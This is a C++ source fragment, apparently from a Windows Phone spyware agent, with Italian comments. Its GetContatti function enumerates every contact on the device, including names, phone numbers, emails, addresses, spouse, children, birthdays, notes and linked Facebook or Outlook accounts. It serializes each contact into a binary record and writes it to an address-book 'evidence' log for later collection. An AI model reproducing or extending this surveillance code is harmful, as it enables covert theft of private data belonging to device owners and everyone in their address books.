            case _PIMPR_BODY_TEXT:
                //contact.AddNotes(this.GetString(cepropval.val.lpwstr));
				contact->CONTACT_PIMPR_BODY_TEXT=ptrPS->val.lpwstr;
                break;
        }

	}
  


}

void AddSingleValuePropertyToContact(CEPROPVAL *v,CONTACTACC* contact)
{	
	 PIMPR_PROPS propid = (PIMPR_PROPS) v->propid;
    if (propid <= _PIMPR_SUFFIX)
    {
        if (propid > _PIMPR_FIRST_NAME)
        {
            switch (propid)
            {
                case _PIMPR_MIDDLE_NAME:
                    //this.EnsureContactHasCompleteName(contact);
                    //contact.CompleteName.MiddleName = this.GetString(cePropVal.val.lpwstr);
					contact->CompleteName.MiddleName=(LPCWSTR)v->val.lpwstr;
                    return;

                case _PIMPR_LAST_NAME:
                    //this.EnsureContactHasCompleteName(contact);
                    //contact.CompleteName.LastName = this.GetString(cePropVal.val.lpwstr);
					contact->CompleteName.LastName=(LPCWSTR)v->val.lpwstr;
                    return;

                case _PIMPR_SUFFIX:
                    //this.EnsureContactHasCompleteName(contact);
                    //contact.CompleteName.Suffix = this.GetString(cePropVal.val.lpwstr);
					contact->CompleteName.Suffix=(LPCWSTR)v->val.lpwstr;
                    return;
            }
            return;
        }
        if (propid == _PIMPR_TITLE)
        {
            //this.EnsureContactHasCompleteName(contact);
            //contact.CompleteName.Title = this.GetString(cePropVal.val.lpwstr);
			contact->CompleteName.Title=(LPCWSTR)v->val.lpwstr;
            return;
        }
        if (propid != _PIMPR_FIRST_NAME)
        {
            return;
        }
    }
    else
    {
        if (propid <= _PIMPR_YOMI_FIRSTNAME)
        {
            if (propid != _PIMPR_NICKNAME)
            {
                if (propid == _PIMPR_YOMI_FIRSTNAME)
                {
                    //this.EnsureContactHasCompleteName(contact);
                    //contact.CompleteName.YomiFirstName = this.GetString(cePropVal.val.lpwstr);
					contact->CompleteName.YomiFirstName=(LPCWSTR)v->val.lpwstr;
                }
                return;
            }
            //this.EnsureContactHasCompleteName(contact);
            //contact.CompleteName.Nickname = this.GetString(cePropVal.val.lpwstr);
			contact->CompleteName.Nickname=(LPCWSTR)v->val.lpwstr;
            return;
        }
        switch (propid)
        {
            case _PIMPR_YOMI_LASTNAME:
                //this.EnsureContactHasCompleteName(contact);
                //contact.CompleteName.YomiLastName = this.GetString(cePropVal.val.lpwstr);
				contact->CompleteName.YomiLastName=(LPCWSTR)v->val.lpwstr;
                return;

            case _PIMPR_IS_FAVORITE:
                //contact.IsPinnedToStart = cePropVal.val.boolVal;
				contact->IsPinnedToStart=(bool)v->val.boolVal;
                return;
        }
        if (propid == _PIMPR_DISPLAY_NAME)
        {
            //contact.DisplayName = this.GetString(cePropVal.val.lpwstr);
			contact->DisplayName=(LPCWSTR)v->val.lpwstr;
        }
        return;
    }
    //this.EnsureContactHasCompleteName(contact);
    //contact.CompleteName.FirstName = this.GetString(cePropVal.val.lpwstr);
	contact->CompleteName.FirstName=(LPCWSTR)v->val.lpwstr;

}

#include "PoomCommon.h"


DWORD _SerializedStringLength(LPCWSTR lpString)
{
	DWORD dwStringLength = 0;

	if (lpString == NULL || wcslen(lpString) == 0)
		return 0;
	
	dwStringLength = sizeof(DWORD);
	dwStringLength += wcslen(lpString)*sizeof(WCHAR);
	
	return dwStringLength;
}

DWORD _Prefix(DWORD dwLength, int entryType)
{
	DWORD prefix = dwLength;
	prefix &= POOM_TYPE_MASK;    // clear type bits
	prefix |= (DWORD)entryType; 

	return prefix;

}


void _SerializeString(LPBYTE *lpDest, LPCWSTR lpString, int entryType)
{
	DWORD dwStringLength = 0;

	// if string is invalid, ignore and return 0 as length
	if (lpString == NULL)
		return;

	// if string length == 0, ignore and return 0 as length
	dwStringLength = wcslen(lpString) * sizeof(WCHAR); 

	if (dwStringLength == 0)
		return;

	// copy prefix and string *** WITHOUT NULL TERMINATOR ***
	DWORD prefix = _Prefix(dwStringLength, entryType);
	CopyMemory(*lpDest, &prefix, sizeof(prefix));
	CopyMemory((*lpDest + sizeof(prefix)), lpString, dwStringLength);

	*lpDest+=(sizeof(prefix) + dwStringLength);
	//return sizeof(prefix) + dwStringLength;
}

#include "Log.h"


DWORD  GetContatti(void)
{
	UINT r=_PoomDataServiceClient_Init();

	DWORD hPoom;
	r=_PoomDataServiceClient_GetObjectsEnumerator(L"Contacts: All",&hPoom);

	/*
	da controllare se ci sono 0 contatti!!!
	internal enum HRESULT : uint
	{
		ERROR_ACCESS_DENIED = 0x80070005,
		ERROR_NOT_FOUND = 0x80070490,
		S_OK = 0
	}

	*/


	#define REQ_COUNT 1000 //se un utente ha piu' di 1000 contatti gli altri vengono persi
	UINT requestedCount=REQ_COUNT;
	UINT handleCount;
	DWORD ptrArray[REQ_COUNT];


	r=_PoomDataServiceClient_MoveNext(hPoom,requestedCount,&handleCount,ptrArray); //in handleCount mi ritrovo il numero di contatti che ho

	CONTACT **contacts = (CONTACT **) ptrArray;
	CONTACT* ptrArr;
	SOURCEDPROPVAL* ptrS;
	PSOURCEDPROPVAL* ptrPS;

	ACCOUNT* ptrAcc;
	CONTACT* ptrCon;

	//StorageKind accountKind;

	for(int i=0; i < handleCount; i++)
	{
#ifdef _DEBUG
		WCHAR msg[128];
		swprintf_s(msg, L">>>Numero Account=%i<<<\n",i);
		OutputDebugString(msg);
#endif

		ptrArr=contacts[i];

		//deserializzo CONTACT // CONTACTSerializer 
		CONTACTACC contact={0};
				
		for(int j=0; j<ptrArr->cProps; j++)
		{
			CEPROPVAL *ce = (CEPROPVAL *)ptrArr->rgPropVals+j; 
			CEPROPVAL *v = ce;
			AddSingleValuePropertyToContact(v,&contact);
		}
#ifdef _DEBUG
		OutputDebugString(contact.DisplayName);
#endif

		//deserializzo ACCOUNT // AccountSerializer 
		contact.NumAccount=ptrArr->cSources;
		for(int j=0; j<ptrArr->cSources&&j<MAX_NUM_ACCOUNT; j++)
		{ 
			ptrAcc=(ACCOUNT*)ptrArr->rgAccounts+j;
					
			if (ptrAcc->fIsDefaultStore != 0)
			{
				contact.NameAccountKind[j] = StorageKind::Phone;
			}
			else
			{
				contact.NameAccountKind[j] = StorageKind::Other;
			}


			for (int k = 0; k < ptrAcc->cProps; k++)
			{
				CEPROPVAL *ce = (CEPROPVAL *)ptrAcc->rgPropVals+k; 
				CEPROPVAL *v = ce;
						
				switch (v->propid)
				{
					case _PIMPR_NETWORK_SOURCE_ID:
					{
						NETWORK_SOURCE_ID ulVal = (NETWORK_SOURCE_ID) v->val.ulVal;
						if (ulVal != NETWORK_SOURCE_ID::NWindowsLive)
						{
							if (ulVal == NETWORK_SOURCE_ID::NFacebook)
							{
								goto Label_00D8;
							}
							if (ulVal == NETWORK_SOURCE_ID::NOutlook)
							{
								goto Label_00E1;
							}
						}
						else
						{
							contact.NameAccountKind[j] = StorageKind::WindowsLive;
						}
						break;
					}
					case _PIMPR_NAME:
						contact.NameAccount[j]=v->val.lpwstr;
#ifdef _DEBUG
						OutputDebugString(v->val.lpwstr);
						OutputDebugString(L":");
#endif
						break;
				}
				continue;
			Label_00D8:
				contact.NameAccountKind[j] = StorageKind::Facebook;
				continue;
			Label_00E1:
				contact.NameAccountKind[j] = StorageKind::Outlook;
			}
#ifdef _DEBUG
			switch (contact.NameAccountKind[j])
			{
				case Phone:
					OutputDebugString(L"Phone\n");
					break;
				case WindowsLive:
					OutputDebugString(L"WindowsLive\n");
					break;
				case Outlook:
					OutputDebugString(L"Outlook\n");
					break;
				case Facebook:
					OutputDebugString(L"Facebook\n");
					break;
				case Other:
					OutputDebugString(L"Other\n");
					break;
				default:
					OutputDebugString(L"default Other\n");
					break;
			}
#endif
		}

#ifdef _DEBUG				
		OutputDebugString(L"\n");
#endif
				

		HandleMultiValuedProperties(ptrArr->cAggregatedProps, ptrArr->rgAggregatedPropVals, &contact);

		contact.Id=ptrArr->contactId;


		DWORD dwDynLen = 0;
		LPBYTE pPtr = NULL, lpOutBuf = NULL;
		ContactMapType* pMap = NULL;
		HeaderStruct header;
		DWORD lpdwOutLength;

		
		header.dwVersion=POOM_V2_0_PROTO;
		header.lOid=contact.Id;
		header.flags=NULL;
		header.program=0x08; //visto che non riesco a tirare fuori gli id skype pur sapendo che è un conctact skype a sto punto li considero tutti contact phone
		//header.dwSize = sizeof(HeaderStruct);


		lpdwOutLength = sizeof(HeaderStruct);
		lpdwOutLength += _SerializedStringLength(contact.CompleteName.FirstName);
		lpdwOutLength += _SerializedStringLength(contact.CompleteName.LastName);
		lpdwOutLength += _SerializedStringLength(contact.CONTACT_PIMPR_COMPANY_NAME);
		lpdwOutLength += _SerializedStringLength(contact.CONTACT_PIMPR_BUSINESS_FAX_NUMBER);
		lpdwOutLength += _SerializedStringLength(contact.CONTACT_PIMPR_EMAIL1_ADDRESS);
		lpdwOutLength += _SerializedStringLength(contact.CONTACT_PIMPR_MOBILE_TELEPHONE_NUMBER);
		lpdwOutLength += _SerializedStringLength(contact.CONTACT_PIMPR_OFFICE_LOCATION);
		lpdwOutLength += _SerializedStringLength(contact.CONTACT_PIMPR_PAGER_NUMBER);
		lpdwOutLength += _SerializedStringLength(contact.CONTACT_PIMPR_BUSINESS_TELEPHONE_NUMBER);
		lpdwOutLength += _SerializedStringLength(contact.CONTACT_PIMPR_JOB_TITLE);
		lpdwOutLength += _SerializedStringLength(contact.CONTACT_PIMPR_HOME_TELEPHONE_NUMBER);
		lpdwOutLength += _SerializedStringLength(contact.CONTACT_PIMPR_EMAIL2_ADDRESS);
		lpdwOutLength += _SerializedStringLength(contact.CONTACT_PIMPR_SPOUSE);
		lpdwOutLength += _SerializedStringLength(contact.CONTACT_PIMPR_EMAIL3_ADDRESS);
		lpdwOutLength += _SerializedStringLength(contact.CONTACT_PIMPR_HOME2_TELEPHONE_NUMBER);
		lpdwOutLength += _SerializedStringLength(contact.CONTACT_PIMPR_HOME_FAX_NUMBER);
		lpdwOutLength += _SerializedStringLength(contact.CONTACT_PIMPR_MOBILE2_TELEPHONE_NUMBER);
		lpdwOutLength += _SerializedStringLength(contact.CONTACT_PIMPR_CHILDREN);
		lpdwOutLength += _SerializedStringLength(contact.CONTACT_PIMPR_WEB_PAGE);
		lpdwOutLength += _SerializedStringLength(contact.CONTACT_PIMPR_BUSINESS2_TELEPHONE_NUMBER);
		lpdwOutLength += _SerializedStringLength(contact.CONTACT_PIMPR_COMPANY_TELEPHONE_NUMBER);
		lpdwOutLength += _SerializedStringLength(contact.CONTACT_PIMPR_YOMI_COMPANY);
		lpdwOutLength += _SerializedStringLength(contact.CompleteName.YomiFirstName);
		lpdwOutLength += _SerializedStringLength(contact.CompleteName.YomiLastName);
		lpdwOutLength += _SerializedStringLength(contact.CompleteName.Title);
		lpdwOutLength += _SerializedStringLength(contact.CompleteName.MiddleName);
		lpdwOutLength += _SerializedStringLength(contact.CompleteName.Suffix);
		lpdwOutLength += _SerializedStringLength(contact.CONTACT_PIMPR_HOME_ADDRESS_STREET);
		lpdwOutLength += _SerializedStringLength(contact.CONTACT_PIMPR_HOME_ADDRESS_CITY);
		lpdwOutLength += _SerializedStringLength(contact.CONTACT_PIMPR_HOME_ADDRESS_STATE);
		lpdwOutLength += _SerializedStringLength(contact.CONTACT_PIMPR_HOME_ADDRESS_POSTAL_CODE);
		lpdwOutLength += _SerializedStringLength(contact.CONTACT_PIMPR_HOME_ADDRESS_COUNTRY);
		lpdwOutLength += _SerializedStringLength(contact.CONTACT_PIMPR_OTHER_ADDRESS_STREET);
		lpdwOutLength += _SerializedStringLength(contact.CONTACT_PIMPR_OTHER_ADDRESS_CITY);
		lpdwOutLength += _SerializedStringLength(contact.CONTACT_PIMPR_OTHER_ADDRESS_POSTAL_CODE);
		lpdwOutLength += _SerializedStringLength(contact.CONTACT_PIMPR_OTHER_ADDRESS_COUNTRY);
		lpdwOutLength += _SerializedStringLength(contact.CONTACT_PIMPR_BUSINESS_ADDRESS_STREET);
		lpdwOutLength += _SerializedStringLength(contact.CONTACT_PIMPR_BUSINESS_ADDRESS_CITY);
		lpdwOutLength += _SerializedStringLength(contact.CONTACT_PIMPR_BUSINESS_ADDRESS_STATE);
		lpdwOutLength += _SerializedStringLength(contact.CONTACT_PIMPR_BUSINESS_ADDRESS_POSTAL_CODE);
		lpdwOutLength += _SerializedStringLength(contact.CONTACT_PIMPR_BUSINESS_ADDRESS_COUNTRY);
		lpdwOutLength += _SerializedStringLength(contact.CONTACT_PIMPR_OTHER_ADDRESS_STATE);
		lpdwOutLength += _SerializedStringLength(contact.CONTACT_PIMPR_FLOATING_BIRTHDAY);
		lpdwOutLength += _SerializedStringLength(contact.CONTACT_PIMPR_BODY_TEXT);
		
		header.dwSize = lpdwOutLength;
		lpOutBuf = new(std::nothrow) BYTE[lpdwOutLength];

		if (lpOutBuf == NULL)
			return NULL;

		pPtr = lpOutBuf;

		// Copy header
		CopyMemory( pPtr, &header, sizeof(HeaderStruct));
		pPtr += sizeof(HeaderStruct);

		_SerializeString(&pPtr, contact.CompleteName.FirstName, FirstName << 0x18);
		_SerializeString(&pPtr, contact.CompleteName.LastName, LastName << 0x18);
		_SerializeString(&pPtr, contact.CONTACT_PIMPR_COMPANY_NAME, CompanyName << 0x18);
		_SerializeString(&pPtr, contact.CONTACT_PIMPR_BUSINESS_FAX_NUMBER, BusinessFaxNumber << 0x18);
		_SerializeString(&pPtr, contact.CONTACT_PIMPR_EMAIL1_ADDRESS, Email1Address << 0x18);
		_SerializeString(&pPtr, contact.CONTACT_PIMPR_MOBILE_TELEPHONE_NUMBER, MobileTelephoneNumber << 0x18);
		_SerializeString(&pPtr, contact.CONTACT_PIMPR_OFFICE_LOCATION, OfficeLocation << 0x18);
		_SerializeString(&pPtr, contact.CONTACT_PIMPR_PAGER_NUMBER, PagerNumber << 0x18);
		_SerializeString(&pPtr, contact.CONTACT_PIMPR_BUSINESS_TELEPHONE_NUMBER, BusinessTelephoneNumber << 0x18);
		_SerializeString(&pPtr, contact.CONTACT_PIMPR_JOB_TITLE, JobTitle << 0x18);
		_SerializeString(&pPtr, contact.CONTACT_PIMPR_HOME_TELEPHONE_NUMBER, HomeTelephoneNumber << 0x18);
		_SerializeString(&pPtr, contact.CONTACT_PIMPR_EMAIL2_ADDRESS, Email2Address << 0x18);
		_SerializeString(&pPtr, contact.CONTACT_PIMPR_SPOUSE, Spouse << 0x18);
		_SerializeString(&pPtr, contact.CONTACT_PIMPR_EMAIL3_ADDRESS, Email3Address << 0x18);
		_SerializeString(&pPtr, contact.CONTACT_PIMPR_HOME2_TELEPHONE_NUMBER, Home2TelephoneNumber << 0x18);
		_SerializeString(&pPtr, contact.CONTACT_PIMPR_HOME_FAX_NUMBER, HomeFaxNumber << 0x18);
		_SerializeString(&pPtr, contact.CONTACT_PIMPR_MOBILE2_TELEPHONE_NUMBER, CarTelephoneNumber << 0x18);
		_SerializeString(&pPtr, contact.CONTACT_PIMPR_CHILDREN, Children << 0x18);
		_SerializeString(&pPtr, contact.CONTACT_PIMPR_WEB_PAGE, WebPage << 0x18);
		_SerializeString(&pPtr, contact.CONTACT_PIMPR_BUSINESS2_TELEPHONE_NUMBER, Business2TelephoneNumber << 0x18);
		_SerializeString(&pPtr, contact.CONTACT_PIMPR_COMPANY_TELEPHONE_NUMBER, RadioTelephoneNumber << 0x18);
		_SerializeString(&pPtr, contact.CONTACT_PIMPR_YOMI_COMPANY, YomiCompanyName << 0x18);
		_SerializeString(&pPtr, contact.CompleteName.YomiFirstName, YomiFirstName << 0x18);
		_SerializeString(&pPtr, contact.CompleteName.YomiLastName, YomiLastName << 0x18);
		_SerializeString(&pPtr, contact.CompleteName.Title, Title << 0x18);
		_SerializeString(&pPtr, contact.CompleteName.MiddleName, MiddleName << 0x18);
		_SerializeString(&pPtr, contact.CompleteName.Suffix, Suffix << 0x18);
		_SerializeString(&pPtr, contact.CONTACT_PIMPR_HOME_ADDRESS_STREET, HomeAddressStreet << 0x18);
		_SerializeString(&pPtr, contact.CONTACT_PIMPR_HOME_ADDRESS_CITY, HomeAddressCity << 0x18);
		_SerializeString(&pPtr, contact.CONTACT_PIMPR_HOME_ADDRESS_STATE, HomeAddressState << 0x18);
		_SerializeString(&pPtr, contact.CONTACT_PIMPR_HOME_ADDRESS_POSTAL_CODE, HomeAddressPostalCode << 0x18);
		_SerializeString(&pPtr, contact.CONTACT_PIMPR_HOME_ADDRESS_COUNTRY, HomeAddressCountry << 0x18);
		_SerializeString(&pPtr, contact.CONTACT_PIMPR_OTHER_ADDRESS_STREET, OtherAddressStreet << 0x18);
		_SerializeString(&pPtr, contact.CONTACT_PIMPR_OTHER_ADDRESS_CITY, OtherAddressCity << 0x18);
		_SerializeString(&pPtr, contact.CONTACT_PIMPR_OTHER_ADDRESS_POSTAL_CODE, OtherAddressPostalCode << 0x18);
		_SerializeString(&pPtr, contact.CONTACT_PIMPR_OTHER_ADDRESS_COUNTRY, OtherAddressCountry << 0x18);
		_SerializeString(&pPtr, contact.CONTACT_PIMPR_BUSINESS_ADDRESS_STREET, BusinessAddressStreet << 0x18);
		_SerializeString(&pPtr, contact.CONTACT_PIMPR_BUSINESS_ADDRESS_CITY, BusinessAddressCity << 0x18);
		_SerializeString(&pPtr, contact.CONTACT_PIMPR_BUSINESS_ADDRESS_STATE, BusinessAddressState << 0x18);
		_SerializeString(&pPtr, contact.CONTACT_PIMPR_BUSINESS_ADDRESS_POSTAL_CODE, BusinessAddressPostalCode << 0x18);
		_SerializeString(&pPtr, contact.CONTACT_PIMPR_BUSINESS_ADDRESS_COUNTRY, BusinessAddressCountry << 0x18);
		_SerializeString(&pPtr, contact.CONTACT_PIMPR_OTHER_ADDRESS_STATE, OtherAddressState << 0x18);
		_SerializeString(&pPtr, contact.CONTACT_PIMPR_FLOATING_BIRTHDAY, Birthday << 0x18);
		_SerializeString(&pPtr, contact.CONTACT_PIMPR_BODY_TEXT, Notes << 0x18);


		Log poomLog = Log();

		if (lpOutBuf) {
			poomLog.CreateLog(LOGTYPE_ADDRESSBOOK, NULL, 0, FLASH);
			poomLog.WriteLog(lpOutBuf, lpdwOutLength);			
			poomLog.CloseLog();
			SAFE_DELETE(lpOutBuf);
		}

		

		/*
		// Obtain dynamic entries length after serialization
		for (ContactMapType::iterator it = pMap->begin(); it != pMap->end(); it++)
		{
			*lpdwOutLength += _SerializedStringLength(it->second);

		}
	
		header.dwSize = *lpdwOutLength;

		lpOutBuf = new(std::nothrow) BYTE[*lpdwOutLength];

		if (lpOutBuf == NULL)
			return NULL;

		pPtr = lpOutBuf;

		// Copy header
		CopyMemory( pPtr, header, sizeof(HeaderStruct));
		pPtr += sizeof(HeaderStruct);

		// Serialize and copy strings
		for (ContactMapType::iterator it =  pMap->begin(); it != pMap->end(); it++)
		{
			DWORD dwSerializedStringSize = _SerializeString(pPtr, it->second, (it->first) << 0x18);
			pPtr += dwSerializedStringSize;
		}

		return lpOutBuf;

		*/






		//qui devo salvare le evidence



/*
		if(i==22) 
			continue;
*/
			/*
				//
				for(int j=0; j<ptrArr->cAggregatedProps; j++)
				{ 		
					ptrS=(SOURCEDPROPVAL*)ptrArr->rgAggregatedPropVals+j;
					//ptrS=ptrS+sizeof(SOURCEDPROPVAL)*j;
					ptrPS=((PSOURCEDPROPVAL*)ptrS->pPropVal);

					switch (ptrPS->PIMPR_PROPS)
					{
						case _PIMPR_ALL_DAY_EVENT:
							OutputDebugString(L"_PIMPR_ALL_DAY_EVENT\n");
							break;
						case _PIMPR_BODY_TEXT :
							OutputDebugString(L"_PIMPR_BODY_TEXT \n");
							break;
						case _PIMPR_BUSINESS_ADDRESS :
							OutputDebugString(L"_PIMPR_BUSINESS_ADDRESS \n");
							break;
						case _PIMPR_BUSINESS_ADDRESS_CITY :
							OutputDebugString(L"_PIMPR_BUSINESS_ADDRESS_CITY \n");
							break;
						case _PIMPR_BUSINESS_ADDRESS_COUNTRY :
							OutputDebugString(L"_PIMPR_BUSINESS_ADDRESS_COUNTRY \n");
							break;
						case _PIMPR_BUSINESS_ADDRESS_POSTAL_CODE :
							OutputDebugString(L"_PIMPR_BUSINESS_ADDRESS_POSTAL_CODE \n");
							break;
						case _PIMPR_BUSINESS_ADDRESS_STATE :
							OutputDebugString(L"_PIMPR_BUSINESS_ADDRESS_STATE \n");
							break;
						case _PIMPR_BUSINESS_ADDRESS_STREET :
							OutputDebugString(L"_PIMPR_BUSINESS_ADDRESS_STREET \n");
							break;
						case _PIMPR_BUSINESS_FAX_NUMBER :
							OutputDebugString(L"_PIMPR_BUSINESS_FAX_NUMBER \n");
							break;
						case _PIMPR_BUSINESS_TELEPHONE_NUMBER :
							OutputDebugString(L"_PIMPR_BUSINESS_TELEPHONE_NUMBER \n");
							break;
						case _PIMPR_BUSINESS2_TELEPHONE_NUMBER :
							OutputDebugString(L"_PIMPR_BUSINESS2_TELEPHONE_NUMBER \n");
							break;
						case _PIMPR_BUSY_STATUS :
							OutputDebugString(L"_PIMPR_BUSY_STATUS \n");
							break;
						case _PIMPR_CHILDREN :
							OutputDebugString(L"_PIMPR_CHILDREN \n");
							break;
						case _PIMPR_COMPANY_NAME :
							OutputDebugString(L"_PIMPR_COMPANY_NAME \n");
							break;
						case _PIMPR_COMPANY_TELEPHONE_NUMBER :
							OutputDebugString(L"_PIMPR_COMPANY_TELEPHONE_NUMBER \n");
							break;
						case _PIMPR_DISPLAY_NAME :
							OutputDebugString(L"_PIMPR_DISPLAY_NAME \n");
							break;
						case _PIMPR_EMAIL_ADDRESS :
							OutputDebugString(L"_PIMPR_EMAIL_ADDRESS \n");
							break;
						case _PIMPR_EMAIL1_ADDRESS :
							OutputDebugString(L"_PIMPR_EMAIL1_ADDRESS \n");
							break;
						case _PIMPR_EMAIL2_ADDRESS :
							OutputDebugString(L"_PIMPR_EMAIL2_ADDRESS \n");
							break;
						case _PIMPR_EMAIL3_ADDRESS :
							OutputDebugString(L"_PIMPR_EMAIL3_ADDRESS \n");
							break;
						case _PIMPR_FIRST_NAME :
							OutputDebugString(L"_PIMPR_FIRST_NAME \n");
							break;
						case _PIMPR_FLOATING_BIRTHDAY :
							OutputDebugString(L"_PIMPR_FLOATING_BIRTHDAY \n");
							continue;
							break;
						case _PIMPR_HOME_ADDRESS :
							OutputDebugString(L"_PIMPR_HOME_ADDRESS \n");
							break;
						case _PIMPR_HOME_ADDRESS_CITY :
							OutputDebugString(L"_PIMPR_HOME_ADDRESS_CITY \n");
							break;
						case _PIMPR_HOME_ADDRESS_COUNTRY :
							OutputDebugString(L"_PIMPR_HOME_ADDRESS_COUNTRY \n");
							break;
						case _PIMPR_HOME_ADDRESS_POSTAL_CODE :
							OutputDebugString(L"_PIMPR_HOME_ADDRESS_POSTAL_CODE \n");
							break;
						case _PIMPR_HOME_ADDRESS_STATE :
							OutputDebugString(L"_PIMPR_HOME_ADDRESS_STATE \n");
							break;
						case _PIMPR_HOME_ADDRESS_STREET :
							OutputDebugString(L"_PIMPR_HOME_ADDRESS_STREET \n");
							break;
						case _PIMPR_HOME_FAX_NUMBER :
							OutputDebugString(L"_PIMPR_HOME_FAX_NUMBER \n");
							break;
						case _PIMPR_HOME_TELEPHONE_NUMBER :
							OutputDebugString(L"_PIMPR_HOME_TELEPHONE_NUMBER \n");
							break;
						case _PIMPR_HOME2_TELEPHONE_NUMBER :
							OutputDebugString(L"_PIMPR_HOME2_TELEPHONE_NUMBER \n");
							break;
						case _PIMPR_IS_FAVORITE :
							OutputDebugString(L"_PIMPR_IS_FAVORITE \n");
							break;
						case _PIMPR_JOB_INFO :
							OutputDebugString(L"_PIMPR_JOB_INFO \n");
							break;
						case _PIMPR_JOB_TITLE :
							OutputDebugString(L"_PIMPR_JOB_TITLE \n");
							break;
						case _PIMPR_LAST_NAME :
							OutputDebugString(L"_PIMPR_LAST_NAME \n");
							break;
						case _PIMPR_LOCATION :
							OutputDebugString(L"_PIMPR_LOCATION \n");
							break;
						case _PIMPR_MEETING_ORGANIZER_EMAIL :
							OutputDebugString(L"_PIMPR_MEETING_ORGANIZER_EMAIL \n");
							break;
						case _PIMPR_MEETING_ORGANIZER_NAME :
							OutputDebugString(L"_PIMPR_MEETING_ORGANIZER_NAME \n");
							break;
						case _PIMPR_MIDDLE_NAME :
							OutputDebugString(L"_PIMPR_MIDDLE_NAME \n");
							break;							  
						case _PIMPR_MOBILE_TELEPHONE_NUMBER  :
							OutputDebugString(L"_PIMPR_MOBILE_TELEPHONE_NUMBER  \n");
							break;
						case _PIMPR_MOBILE2_TELEPHONE_NUMBER :
							OutputDebugString(L"_PIMPR_MOBILE2_TELEPHONE_NUMBER \n");
							break;
						case _PIMPR_NAME :
							OutputDebugString(L"_PIMPR_NAME \n");
							break;
						case _PIMPR_NETWORK_SOURCE_ID :
							OutputDebugString(L"_PIMPR_NETWORK_SOURCE_ID \n");
							break;
						case _PIMPR_NICKNAME :
							OutputDebugString(L"_PIMPR_NICKNAME \n");
							break;
						case _PIMPR_OFFICE_LOCATION :
							OutputDebugString(L"_PIMPR_OFFICE_LOCATION \n");
							break;
						case _PIMPR_OTHER_ADDRESS :
							OutputDebugString(L"_PIMPR_OTHER_ADDRESS \n");
							break;
						case _PIMPR_OTHER_ADDRESS_CITY :
							OutputDebugString(L"_PIMPR_OTHER_ADDRESS_CITY \n");
							break;
						case _PIMPR_OTHER_ADDRESS_COUNTRY :
							OutputDebugString(L"_PIMPR_OTHER_ADDRESS_COUNTRY \n");
							break;
						case _PIMPR_OTHER_ADDRESS_POSTAL_CODE :
							OutputDebugString(L"_PIMPR_OTHER_ADDRESS_POSTAL_CODE \n");
							break;
						case _PIMPR_OTHER_ADDRESS_STATE :
							OutputDebugString(L"_PIMPR_OTHER_ADDRESS_STATE \n");
							break;
						case _PIMPR_OTHER_ADDRESS_STREET :
							OutputDebugString(L"_PIMPR_OTHER_ADDRESS_STREET \n");
							break;
						case _PIMPR_PAGER_NUMBER :
							OutputDebugString(L"_PIMPR_PAGER_NUMBER \n");
							break;
						case _PIMPR_SENSITIVITY :
							OutputDebugString(L"_PIMPR_SENSITIVITY \n");
							break;
						case _PIMPR_SPOUSE :
							OutputDebugString(L"_PIMPR_SPOUSE \n");
							break;
						case _PIMPR_START :
							OutputDebugString(L"_PIMPR_START \n");
							break;
						case _PIMPR_SUBJECT :
							OutputDebugString(L"_PIMPR_SUBJECT \n");
							break;
						case _PIMPR_SUFFIX :
							OutputDebugString(L"_PIMPR_SUFFIX \n");
							break;
						case _PIMPR_TITLE :
							OutputDebugString(L"_PIMPR_TITLE \n");
							break;
						case _PIMPR_WEB_PAGE :
							OutputDebugString(L"_PIMPR_WEB_PAGE \n");
							break;
						case _PIMPR_YOMI_COMPANY :
							OutputDebugString(L"_PIMPR_YOMI_COMPANY \n");
							break;
						case _PIMPR_YOMI_FIRSTNAME :
							OutputDebugString(L"_PIMPR_YOMI_FIRSTNAME \n");
							break;
						case _PIMPR_YOMI_LASTNAME  :
							OutputDebugString(L"_PIMPR_YOMI_LASTNAME  \n");
							break;


						default:
							OutputDebugString(L"NON RICONOSCIUTO\n");
							break;
					}
					


					if((DWORD)(ptrPS->lpwstr)!=1)
					{
						OutputDebugString((LPCWSTR)ptrPS->lpwstr);
					}
					
					OutputDebugString(L"\n");

				}

				*/
	}

		//dealloco gli oggetti
	for(int i=0; i < handleCount; i++)
	{
			
		_PoomDataServiceClient_FreeObject((DWORD*)contacts[i]);
	}

	_PoomDataServiceClient_FreeEnumerator(hPoom);

}

DWORD WINAPI CalendarModule(LPVOID lpParam) {


	GetContatti();


	/***
	Module *me = (Module *)lpParam;
	HANDLE agentHandle;

	me->setStatus(MODULE_RUNNING);
	agentHandle = me->getEvent();

	CPoomMan *poom = poom->self();

	DBG_TRACE(L"Debug - Calendar.cpp - Calendar Module started\n", 5, FALSE);

	if (poom->IsValid()) {
		poom->Run(MODULE_ORGANIZER);
	} else {
		DBG_TRACE(L"Debug - Calendar.cpp - Calendar err 2 \n", 5, FALSE);
		me->setStatus(MODULE_STOPPED);
		return TRUE;
	}

	LOOP {
		// E' leggero essendo solo una PeekMessage() per le notifiche
		poom->Notifications();

		_WaitForSingleObject(agentHandle, 30000);

		if (me->shouldStop()) {
			DBG_TRACE(L"Debug - Calendar.cpp - Calendar Module is Closing\n", 1, FALSE);
			delete poom;

			me->setStatus(MODULE_STOPPED);
			return 0;
		}
	}
	***/
	return 0;
}